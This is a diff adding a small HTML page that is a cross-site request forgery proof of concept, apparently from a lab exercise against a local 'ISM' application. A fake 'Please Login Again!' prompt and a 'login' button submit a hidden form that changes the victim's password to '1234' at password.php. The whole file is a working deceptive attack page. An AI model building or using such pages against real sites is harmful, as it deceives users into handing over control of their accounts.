@@ -1,0 +1,22 @@
+<html>
+  <head></head>
+  <body>
+    <form
+      id="pass_form"
+      action="http://localhost/ISM/password.php"
+      method="POST"
+    >
+      <input type="hidden" name="Password" value="1234" />
+      <input type="hidden" name="Change" />
+      <p style="color: red">
+        ! Please Login Again!
+      </p>
+      <button id="btn" onclick="change();">login</button>
+    </form>
+    <script>
+      function change() {
+        document.getElementById("pass_form").submit();
+      }
+    </script>
+  </body>
+</html>
